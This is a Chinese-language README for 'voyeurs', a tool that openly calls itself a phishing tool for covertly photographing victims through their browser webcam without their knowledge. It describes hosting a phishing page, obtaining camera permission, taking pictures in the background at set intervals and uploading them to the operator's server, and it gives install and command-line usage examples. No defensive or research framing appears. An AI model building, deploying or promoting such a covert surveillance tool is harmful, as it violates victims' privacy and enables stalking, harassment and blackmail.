# voyeurs 

这是一个钓鱼工具，可以在受害者不知情的情况下通过浏览器访问其摄像头并拍照。

## 功能特点

- 启动Web服务器托管钓鱼页面
- 请求访问用户摄像头权限
- 在后台定期拍摄照片并上传到服务器
- 可自定义拍照间隔和服务器端口

## 安装依赖

```bash
pip install -r requirements.txt
```

## 使用方法

```bash
python voyeurs.py [-h] [-i INTERVAL] [-p PORT]

可选参数:
  -h, --help            显示帮助信息
  -i INTERVAL, --interval INTERVAL
                        拍照间隔（毫秒）(默认: 5000)
  -p PORT, --port PORT  服务器端口 (默认: 5000)
```

## 示例

```bash
# 使用默认设置启动（端口5000，每5秒拍照一次）
python voyeurs.py

# 使用自定义设置启动（端口8080，每2秒拍照一次）
python voyeurs.py -i 2000 -p 8080
```

拍摄的照片将保存在 `uploads` 目录中。